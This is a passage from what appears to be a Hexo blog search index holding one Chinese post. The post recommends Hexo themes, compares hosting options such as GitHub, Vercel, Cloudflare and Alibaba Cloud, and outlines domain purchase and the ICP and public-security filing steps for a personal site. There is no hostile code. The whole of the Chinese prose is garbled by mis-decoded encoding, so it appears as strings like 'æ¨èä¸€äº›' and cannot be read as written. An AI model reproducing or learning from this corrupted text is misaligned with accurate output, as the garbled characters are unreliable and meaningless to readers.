href="#æ¨èä¸€äº›åˆ«çš„ä¸»é¢˜" class="headerlink" title="æ¨èä¸€äº›åˆ«çš„ä¸»é¢˜"></a>æ¨èä¸€äº›åˆ«çš„ä¸»é¢˜</h3><ol><li><a href="https://github.com/xzhih/hexo-theme-casper" style="color: #177cb0; text-decoration: underline;text-decoration-style: dotted;">casperä¸»é¢˜</a>,è¿™ç®—æ˜¯æˆ‘çœ‹ä¸‹æ¥æœ€ç®€æ´,æœ€æœ‰å¤§å‚èŒƒçš„ä¸»é¢˜äº†,å¦‚æœæˆ‘è¿˜æœ‰ç©ºæŠ˜è…¾çš„è¯,è¿™å°±æ˜¯æˆ‘ä¸‹ä¸€ä¸ªåšå®¢çš„ä¸»é¢˜äº†</li><li><a href="https://docs.anheyu.com/" style="color: #177cb0; text-decoration: underline;text-decoration-style: dotted;">å®‰çŸ¥é±¼</a>,è¿™ä¹Ÿæ˜¯æˆ‘å¾ˆå–œæ¬¢çš„ä¸€ä¸ªä¸»é¢˜,casper,å¿˜äº†æˆ‘å§(å¤§é›¾)</li><li><a href="https://github.com/theme-next/hexo-theme-next" style="color: #177cb0; text-decoration: underline;text-decoration-style: dotted;">nextä¸»é¢˜</a></li><li><a href="https://github.com/litten/hexo-theme-yilia" style="color: #177cb0; text-decoration: underline;text-decoration-style: dotted;">yimliaä¸»é¢˜</a></li></ol><p>æ›´å¤šä¸»é¢˜å¯ä»¥å»<del>ä¸–ç•Œæœ€å¤§ç”·æ€§äº¤å‹ç½‘ç«™</del><strong>github</strong>è‡ªè¡Œå¯»æ‰¾</p><hr><h2 id="å…³äºæœåŠ¡å™¨"><a href="#å…³äºæœåŠ¡å™¨" class="headerlink" title="å…³äºæœåŠ¡å™¨"></a>å…³äºæœåŠ¡å™¨</h2><h3 id="github"><a href="#github" class="headerlink" title="github"></a>github</h3><p>è§‰å¾—éº»çƒ¦çš„åŒå­¦å¯ä»¥ç›´æ¥ä½¿ç”¨githubå½“ç½‘ç«™æ‰˜ç®¡,çœäº‹åˆçœé’±,å°±æ˜¯è®¿é—®é€Ÿåº¦æœ‰ç‚¹æ‰è¥Ÿè§è‚˜</p><h3 id="ç½‘ç«™æ‰˜ç®¡"><a href="#ç½‘ç«™æ‰˜ç®¡" class="headerlink" title="ç½‘ç«™æ‰˜ç®¡"></a>ç½‘ç«™æ‰˜ç®¡</h3><p>è¿˜æœ‰å°±æ˜¯ä¸€äº›ç½‘ç«™æ‰˜ç®¡å¹³å°,åƒvercel,cloudflareç­‰,ä¸è¿‡ä¼šç»å¸¸è¢«å¢™å°±æ˜¯äº†,ä¼¼ä¹vercelå·²ç»å¯„äº†,æ‰˜ç®¡å’ŒåŠ é€Ÿäº†å¤ªå¤šè¯ˆéª—ç½‘ç«™(ä¹)</p><h3 id="æ‹¥æœ‰è‡ªå·±çš„äº‘æœåŠ¡å™¨-æ¨è"><a href="#æ‹¥æœ‰è‡ªå·±çš„äº‘æœåŠ¡å™¨-æ¨è" class="headerlink" title="æ‹¥æœ‰è‡ªå·±çš„äº‘æœåŠ¡å™¨(æ¨è)"></a>æ‹¥æœ‰è‡ªå·±çš„äº‘æœåŠ¡å™¨(æ¨è)</h3><p>æœ‰é—²ç½®çš„æœºå™¨å¹¶ä¸”å–œæ¬¢æŠ˜è…¾çš„åŒå­¦å¯ä»¥è‡ªå·±æ,ç½‘ä¸Šæœ‰å¾ˆå¤šæ•™ç¨‹,ä¸è¿‡å¤§å¤šæ•°äººåº”è¯¥æ²¡æœ‰å¤šä½™çš„æœºå™¨,æ‰€ä»¥å°±ä¸è¯¦ç»†æè¿°äº†</p><p>å›½å†…äº‘æœåŠ¡å™¨å‚å•†çš„ä¸»æµé€‰æ‹©å°±æ˜¯é˜¿é‡Œäº‘,åä¸ºäº‘å’Œè…¾è®¯äº‘,å½“ç„¶ä½ å»ç™½å«–å›½å¤–äº‘æœåŠ¡å™¨å‚å•†çš„æœåŠ¡å™¨ä¹Ÿæ˜¯å¯ä»¥çš„</p><hr><h2 id="å°†ç½‘ç«™éƒ¨ç½²åˆ°è‡ªå·±çš„æœåŠ¡å™¨ä¸Š"><a href="#å°†ç½‘ç«™éƒ¨ç½²åˆ°è‡ªå·±çš„æœåŠ¡å™¨ä¸Š" class="headerlink" title="å°†ç½‘ç«™éƒ¨ç½²åˆ°è‡ªå·±çš„æœåŠ¡å™¨ä¸Š"></a>å°†ç½‘ç«™éƒ¨ç½²åˆ°è‡ªå·±çš„æœåŠ¡å™¨ä¸Š</h2><p>æ¨èæ¨èyyyzçš„<a href="https://www.bilibili.com/video/BV1qU4y1K7Hk/?spm_id_from=333.999.0.0&vd_source=26068b3fc005480cb76f959e037a7a07" style="color: #177cb0; text-decoration: underline;text-decoration-style: dotted;">è§†é¢‘æ•™ç¨‹</a>å’Œ<a href="https://www.yyyzyyyz.cn/" style="color: #177cb0; text-decoration: underline;text-decoration-style: dotted;">åšå®¢</a></p><p>å»ºè®®è·Ÿç€ä¸€æ­¥æ­¥å»æ“ä½œ,å¦åˆ™ä½ å°±ä¼šå‘ç°é€šè¿‡æœåŠ¡å™¨çš„å…¬ç½‘ipè®¿é—®ä¸åˆ°ä½ çš„åšå®¢,å½“ç„¶åšå®¢å·²ç»å†™çš„å¾ˆè¯¦å®äº†,æœ‰åŸºç¡€å¯ä»¥ç›´æ¥è·Ÿç€æ“ä½œ</p><p>æˆ‘ç”¨çš„æ˜¯é˜¿é‡Œäº‘çš„æœåŠ¡å™¨,å»ºè®®å…ˆæŠŠç™½å«–å…­ä¸ªæœˆæœåŠ¡å™¨è¦æ±‚çš„æ•™ç¨‹åšäº†,è¿™æ ·ä½ å‡ ä¹ä¸ä¼šç¢°åˆ°ä»€ä¹ˆå›°éš¾(è¡€æ³ªæ•™è®­)</p><hr><h2 id="å…³äºä¸Šçº¿ç½‘ç«™çš„æ‰‹ç»­"><a href="#å…³äºä¸Šçº¿ç½‘ç«™çš„æ‰‹ç»­" class="headerlink" title="å…³äºä¸Šçº¿ç½‘ç«™çš„æ‰‹ç»­"></a>å…³äºä¸Šçº¿ç½‘ç«™çš„æ‰‹ç»­</h2><p>å‡ ä¹å…¨éƒ¨æµç¨‹éƒ½å¯ä»¥åœ¨äº‘æœåŠ¡å‚å•†é‚£èµ°å®Œ,è€Œä¸”è¿˜æœ‰ä»£åŠæœåŠ¡,åªä¸è¿‡è¦é’±å°±æ˜¯äº†</p><p>é¦–å…ˆ,è¦æœ‰è‡ªå·±çš„åŸŸå,åœ¨ä½ çš„äº‘æœåŠ¡å‚å•†é‚£è´­ä¹°å³å¯,å¤§å®¶å¯ä»¥æ ¹æ®è‡ªå·±çš„ç»æµå®åŠ›å’Œå–œå¥½è´­ä¹°,ä¸»è¦è‡ªå·±ç©å¯ä»¥ä¹°.cc,ä¸»è¦è®¿é—®è€…åœ¨å›½å†…æ¨è.cn,å¸Œæœ›å›½é™…åŒ–ä¸€ç‚¹å°±ä¹°.com(å°±æ˜¯ç»æµå®åŠ›ä¸å…è®¸,å¤ªè´µäº†),å»ºè®®å¤šä¹°ä¸¤å¹´,ä¹°å®Œèµ°æŠ¥å¤‡æµç¨‹,æˆ–è€…æµç¨‹èµ°å®Œå†ä¹°éƒ½å¯</p><p>ç„¶åå°±æ˜¯ICTå¤‡æ¡ˆäº†,å„ä¸ªçœä»½çš„è¦æ±‚æœ‰æ‰€ä¸åŒ,å»ºè®®é€‰æ‹©è‡ªå·±èº«ä»½è¯æ‰€åœ¨åœ°åŒºè¿›è¡ŒæŠ¥å¤‡,å¯èƒ½ä¼šå°‘ä¸€äº›éº»çƒ¦,æˆ‘åœ¨æ±Ÿè‹æŠ¥å¤‡,éœ€è¦èº«ä»½è¯ç…§ç‰‡,äººè„¸éªŒè¯,å±…ä½è¯,ä¸¤ä»½æ‰¿è¯ºä¹¦,æ‰¿è¯ºè§†é¢‘,è¿˜æœ‰å±…ä½è¯(å­¦ç”Ÿæ²¡æœ‰çš„è¯ä¼ èº«ä»½è¯å³å¯),ä¸ªäººè§‰å¾—å¾ˆç¹ç.è¿˜æœ‰ä»¥åšå®¢çš„åä¹‰å»ºç«™,ç«™ç‚¹åç§°éœ€è¦å¸¦ä¸Šä¸ªäººçœŸå®å§“å,äº’è”ç½‘å’©æœ‰éšç§(æ‚²)</p><p>æœ€åå°±æ˜¯å…¬å®‰å¤‡æ¡ˆå•¦,ç½‘ä¸Šæœ‰è¯´å¯å¤‡å¯ä¸å¤‡çš„,ä½†æ˜¯å»ºè®®å¤‡æ¡ˆä¸€ä¸‹,å›½å†…çš„ç›‘ç®¡è¶Šæ¥è¶Šä¸¥äº†,åˆ°æ—¶å€™å‡ºäº‹äº†å°±ä¸å¥½äº†</p>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> blog </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
